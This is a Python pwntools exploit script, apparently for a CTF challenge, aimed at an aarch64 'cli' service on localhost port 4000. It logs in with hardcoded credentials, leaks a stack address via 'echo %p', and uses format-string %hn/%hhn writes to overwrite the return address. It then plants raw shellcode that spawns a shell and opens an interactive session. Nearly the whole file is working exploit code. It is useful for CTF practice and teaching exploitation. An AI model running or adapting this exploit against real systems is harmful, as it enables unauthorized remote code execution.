#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'qemu-aarch64'
context.terminal = ['tmux', 'new-window']
argv = ['-L', '.', 'cli']
env = {}

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
#breakrva 0xc6c
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start(argv, env=env)

io.sendlineafter("login: ", "admin")
io.sendlineafter("password: ", "admin1")

io.sendlineafter("> ", "mode advanced")

io.sendlineafter("> ", "echo %p")
leak = io.recvline()[:-1]
leak = int(leak, 16)

stack_leak = leak + 0x208-0x1
main_ret = leak - 0x25

lower = main_ret & 0xffff

#io.sendlineafter("> ", "echo %50$p")
#io.sendlineafter("> ", f"echo %123c%50$hh")

print(hex(main_ret))
print(hex(stack_leak))
for i in range(0x5):
    stack_b = stack_leak >> (8*i) & 0xff
    io.sendlineafter("> ", f"echo %{lower + i}c%50$hn")
    io.sendlineafter("> ", f"echo %{stack_b}c%58$hhn")
    print(hex(stack_b))


sc = b"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"

#print(str(shellcraft.sh()))

print("phase 2")
lower = stack_leak & 0xffff
for i in range(len(sc)):
    b = sc[i]
    io.sendlineafter("> ", f"echo %{lower + i}c%50$hn")
    io.sendlineafter("> ", f"echo %{b}c%58$hhn")

io.sendlineafter("> ", "exit")

io.interactive()
